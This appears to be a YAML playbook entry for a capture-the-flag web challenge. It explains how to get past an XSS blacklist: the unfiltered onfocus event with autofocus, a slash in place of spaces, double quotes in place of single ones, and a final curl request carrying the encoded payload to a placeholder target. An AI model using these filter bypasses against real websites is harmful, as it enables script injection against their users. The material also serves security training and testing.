name: xss_blacklist_alternative_events_cross13
category: web
tags: [xss, injection, blacklist_bypass, onfocus, slash_separator]
indicators:
  - "Input directly inserted into HTML"
  - "Blacklist filters script, onerror, onclick, onmouseover"
  - "Blacklist filters single quote and space"
  - "Need to trigger alert('XSS')"

tricks:
  - name: "Step 1: Identify blacklist"
    when: "Analyze source code"
    how: "Blacklist contains script, onerror, onclick, onmouseover, single quote, space"
    payload: |
      blacklist = ['script', 'onerror','onclick','onmouseover',"'", " "]

  - name: "Step 2: Find unfiltered events"
    when: "Common events filtered"
    how: "onfocus, onload, onblur, onanimationend not filtered"
    payload: |
      onfocus=alert(...)

  - name: "Step 3: Bypass space filter"
    when: "Space is filtered"
    how: "Use / to separate tag name and attributes"
    payload: |
      <input/onfocus=...>

  - name: "Step 4: Bypass single quote filter"
    when: "Single quote filtered"
    how: "Use double quotes instead"
    payload: |
      alert("XSS")  # instead of alert('XSS')

  - name: "Step 5: Submit payload"
    when: "Execute attack"
    how: "GET request to /page with name parameter"
    payload: |
      curl "http://TARGET/page?name=%3Cinput/onfocus=alert(%22XSS%22)/autofocus%3E"
